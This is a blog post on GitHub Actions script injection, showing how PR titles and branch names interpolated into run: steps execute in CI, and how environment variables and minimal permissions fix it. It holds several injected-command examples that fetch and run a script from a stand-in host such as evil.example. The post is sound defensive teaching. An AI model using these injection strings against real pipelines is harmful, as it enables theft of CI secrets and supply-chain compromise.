---
title: "🎣 Pwn Requests: How a Pull Request Title Can Steal Your CI Secrets"
date: "2026-07-11"
excerpt: "You locked down your AWS credentials with OIDC, rotated every API key, and banned long-lived secrets from the repo. Then someone opens a PR titled '; curl evil.sh | sh #' and your CI runner hands over the keys anyway. Let's talk about script injection in GitHub Actions."
tags:
  - security
  - github-actions
  - ci-cd
  - devsecops
  - cybersecurity
featured: true
---

Here's a fun one: you can compromise a CI pipeline without writing a single line of malicious code. No exploit, no CVE, no fancy binary. Just a pull request title. That's it. That's the attack.

I know how that sounds. Let me back up.

## The setup nobody thinks twice about

Somewhere in your `.github/workflows/` directory, there's probably a step that looks like this:

```yaml
- name: Greet contributor
  run: |
    echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
```

Totally innocent. It prints the PR title in a log. Except `${{ }}` expressions in GitHub Actions aren't sandboxed input — they're string-substituted directly into the shell script *before* the shell ever runs. GitHub isn't passing the title as an argument. It's literally rewriting your YAML with the attacker's text pasted in, then executing whatever comes out.

So if I open a PR titled:

```
"; curl -s https://evil.example/x.sh | bash; echo "
```

your `run:` step becomes:

```bash
echo "Thanks for the PR: "; curl -s https://evil.example/x.sh | bash; echo ""
```

Congratulations, my script just ran inside your CI runner. And depending on which trigger fired that workflow, "my script" might have access to your repo secrets, your `GITHUB_TOKEN` with write permissions, or — if you've been diligent about OIDC — a short-lived AWS credential that's plenty long-lived enough to do damage in the sixty seconds a job actually runs.

This isn't theoretical. It's a well-documented class of bug security researchers call **"pwn requests,"** and it's quietly bitten large, security-conscious projects — not because their engineers were careless, but because the vulnerability hides in a place nobody reviews as "code": a template string in a YAML file.

## Where the untrusted input actually comes from

The `${{ github.event.pull_request.title }}` example is the easy one to spot once you know to look for it. The dangerous part is how many event fields are fully attacker-controlled:

- `github.event.pull_request.title` / `.body`
- `github.event.pull_request.head.ref` (the branch name!)
- `github.event.issue.title` / `.body`
- `github.event.commits[*].message`
- `github.head_ref`
- Any `.body` on a comment, review, or discussion

Any contributor — including a first-time contributor from a fork with zero commit access — controls every one of these. A branch name is just as exploitable as a PR title:

```bash
git checkout -b '$(curl evil.example|bash)'
```

If a workflow ever interpolates `github.head_ref` into a shell command, that branch name alone pops the runner.

## Why `pull_request_target` makes it so much worse

Normal `pull_request` workflows from forks run with a read-only token and no access to repo secrets by default — that's GitHub's actual safety net. The real damage shows up when a workflow uses `pull_request_target` instead, usually because someone needed secrets available to comment on PRs, post previews, or run a labeler bot.

`pull_request_target` runs in the context of the *base* repository, with full access to secrets, **and checks out the attacker's fork code alongside it**. That combination — untrusted input, secrets in scope, attacker-controlled code nearby — is exactly the setup that led to several high-profile supply-chain incidents where a malicious PR turned into a secrets leak or, worse, a compromised release artifact.

## The fix: never let expressions touch a shell

The rule is simple and it doesn't require giving up the convenience: **untrusted `${{ }}` values never go directly into `run:`.** Pass them through an environment variable instead, so the shell sees a variable reference, not a template-expanded string.

```yaml
- name: Greet contributor
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR: $PR_TITLE"
```

That one change defuses the injection. `env:` values are passed through the process environment, not string-substituted into the script text — so `"; curl evil.sh | bash; echo "` just prints as a literal, slightly weird PR title instead of executing.

A few other things worth doing at the same time:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Set explicit, minimal `permissions:` on every workflow (or job) instead of relying on the repo default `GITHUB_TOKEN` scope, which is often broader than any single job needs. And if you genuinely need `pull_request_target` for a bot-style workflow, keep the privileged part in a separate job that never checks out the fork's code — do the risky read-only work under plain `pull_request`, hand off just the data you need via artifacts, and let a second, secret-bearing job consume that data without ever touching attacker-controlled source.

On my team at Cubet, we added a step to our CI review checklist that's just: "does this workflow interpolate `${{ github.event.* }}` inside a `run:` block?" It takes ten seconds to grep for and it's caught more than one well-meaning "just log the PR title for debugging" commit before it merged. Cheap insurance for a bug class that's genuinely easy to miss in review, because reviewers are scanning for logic errors, not for the fact that YAML templating and shell execution happen to share a syntax collision.

## The takeaway

We spend a lot of energy locking down *credentials* in CI — rotating keys, moving to OIDC, scoping IAM roles down to nothing. All of that is good and necessary. But none of it matters if the pipeline itself will happily run whatever string a stranger typed into a form field. Secrets management protects the vault. Input handling protects the door. You need both.

If your workflows print PR titles, issue bodies, or branch names anywhere near a `run:` step, go check them today — it'll take less time than reading this post did.

---

Found a `run:` step in your workflows that needs fixing? Or have a pwn-request war story? I'd love to hear it — find me on [GitHub](https://github.com/kpanuragh) or [LinkedIn](https://linkedin.com/in/anuragh-k-p).
